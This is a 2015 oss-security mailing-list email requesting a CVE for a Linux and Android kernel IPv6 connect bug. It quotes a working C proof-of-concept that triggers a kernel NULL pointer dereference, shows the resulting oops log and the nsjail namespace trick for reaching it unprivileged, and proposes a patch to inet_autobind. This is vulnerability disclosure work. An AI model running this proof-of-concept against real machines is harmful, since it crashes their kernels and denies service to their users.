X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2300" "Wednesday" "9" "December" "2015" "16:37:26" "+0100" "=?UTF-8?B?Um9iZXJ0IMWad2nEmWNraQ==?=" "robert@swiecki.net" "<CAP145pjaoc+Cn=E-AtTW2kZmBhouJPrKxjcqP+B6HT8HFbjjNg@mail.gmail.com>" "89" "Re: [oss-security] CVE request - Android kernel - IPv6 connect cause a denial of service" nil nil nil "12" "2015120915:37:26" "[oss-security] CVE request - Android kernel - IPv6 connect cause a denial of service" (number mark "U       robert@swiec Dec  9   89/2300  " thread-indent "\"Re: [oss-security] CVE request - Android kernel - IPv6 connect cause a denial of service\"\n") "<2166DED8C457614D95A6AAC18B144F082B530E@EX02.corp.qihoo.net>" ("<2166DED8C457614D95A6AAC18B144F082B530E@EX02.corp.qihoo.net>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 28321 invoked by uid 550); 9 Dec 2015 15:37:39 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 28286 invoked from network); 9 Dec 2015 15:37:38 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=swiecki.net; s=google;
        h=mime-version:in-reply-to:references:date:message-id:subject:from:to
         :content-type;
        bh=wkOH6jkdSWabYJZLzF3ZIh1Gy35ZQmpi2MlpTqFYZGI=;
        b=J8hk7203diugsFZZA2m1gMekUZeceFaMkm5mcZdeWDlH+Fi+TkgwL8Hd66Z7308e6S
         b2u2A0LTS4bLS1y8qolRHQgz8u/ayZR+koCzB/WfUFhONhagVBLS0VImWEV71eC+dW8m
         BFErlmSBeRoO5JodnhgIVkznoz1rcGVTQmtaU=
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:in-reply-to:references:date
         :message-id:subject:from:to:content-type;
        bh=wkOH6jkdSWabYJZLzF3ZIh1Gy35ZQmpi2MlpTqFYZGI=;
        b=PfDr2n2cyMZjCoygdBKUrGTJ0+ZXnyjJ/3KZxX0hFh1d59OmAV9swZzRXSR0XgvxDi
         RoyMJAEGQgn/V+SG1MZ4VFzbFZ5mYQlLMCEpLM5B9mxenXNvUJVlpBRHnotfX2jlzi94
         nfmMU1TOLjyBtHJU5vFRyvK27B0lWlMMtl55gTfrnY+t64oFyAWEKsm1VyXDriQyvF5J
         X0U3BC3yGHOWZwjo8F9AhlHj0dZyQDKLxRF4urDsgbRXKeTenl859RuleN6N1F2rq/pw
         Yz8Ec1QaBQPwzklpNk3wNwXXTfwt3UTUInu8UIzzgwF9n9mNCfxI3Ed6KvPAolyW9GWk
         IZsw==
X-Gm-Message-State: ALoCoQnkR2yvHTSCQukpIhLglTXuHvNtJbsGI5IveN2D0du6rj8YUPKzk6OX3DCU6AMResLCfXr2X1PzCyzBO+EnD1A06L8eaQ==
MIME-Version: 1.0
X-Received: by 10.194.240.194 with SMTP id wc2mr6655380wjc.27.1449675446989;
 Wed, 09 Dec 2015 07:37:26 -0800 (PST)
In-Reply-To: <2166DED8C457614D95A6AAC18B144F082B530E@EX02.corp.qihoo.net>
References: <2166DED8C457614D95A6AAC18B144F082B530E@EX02.corp.qihoo.net>
Date: Wed, 9 Dec 2015 16:37:26 +0100
Message-ID: <CAP145pjaoc+Cn=E-AtTW2kZmBhouJPrKxjcqP+B6HT8HFbjjNg@mail.gmail.com>
From: =?UTF-8?B?Um9iZXJ0IMWad2nEmWNraQ==?= <robert@swiecki.net>
To: oss-security@lists.openwall.com
Content-Type: multipart/alternative; boundary=089e013d1d0a0ecb30052678de39
Subject: Re: [oss-security] CVE request - Android kernel - IPv6 connect cause
 a denial of service

--089e013d1d0a0ecb30052678de39
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable

This also works under modern Linux kernels - and the SOCK_RAW socket can be
created with namespaces.

$ ~/src/nsjail/nsjail -Mo --user 0 --group 0 --keep_caps --chroot / --
/bin/sh -i
sh-4.3# /home/test/a

[  513.294978] BUG: unable to handle kernel NULL pointer dereference at
      (null)
[  513.294990] IP: [<          (null)>]           (null)
[  513.294995] PGD 70579e067 PUD 70e0f7067 PMD 0
[  513.295001] Oops: 0010 [#2] SMP

Tested with:

$ uname -a
Linux ABC 4.2.0-18-generic #22~14.04.1-Ubuntu SMP Fri Nov 6 22:20:11 UTC
2015 x86_64 x86_64 x86_64 GNU/Linux


2015-12-09 11:15 GMT+01:00 =E9=83=AD=E6=B0=B8=E5=88=9A <guoyonggang@360.cn>:

>
> POC:
> #include <linux/types.h>
> #include <stdlib.h>
> #include <stdio.h>
> #include <sys/stat.h>
> #include <fcntl.h>
> #include <errno.h>
> #include <pthread.h>
> #include <sys/socket.h>
> #include <sys/un.h>
> #include <netinet/in.h>
> int main(void){
>
>          int socket_fd;
>          struct sockaddr_in addr;
>          addr.sin_port =3D 0;
>          addr.sin_addr.s_addr =3D INADDR_ANY;
>          addr.sin_family =3D 10;
>
>          socket_fd =3D socket(10,3,0x40000000);
>          connect(socket_fd , &addr,16);
>
>          return 0;
>
> }
>
> Analysis of causes:
> In the file net/ipv4/af_inet.c , It will cause pc is 0x0  , if the
> sk->sk_prot->get_port is NULL.
> static int inet_autobind(struct sock *sk)
> {
>          struct inet_sock *inet;
>          /* We may need to bind the socket. */
>          lock_sock(sk);
>          inet =3D inet_sk(sk);
>          if (!inet->inet_num) {
>                    if (sk->sk_prot->get_port(sk, 0)) {
>                             release_sock(sk);
>                             return -EAGAIN;
>                    }
>                    inet->inet_sport =3D htons(inet->inet_num);
>          }
>          release_sock(sk);
>          return 0;
> }
>
> Solution:
>
>          Add check as follow:
>                   if (sk->sk_prot->get_port &&sk->sk_prot->get_port(sk,
> 0)) {
>                             release_sock(sk);
>                             return -EAGAIN;
>                    }
>
>


--=20
Robert =C5=9Awi=C4=99cki

--089e013d1d0a0ecb30052678de39--
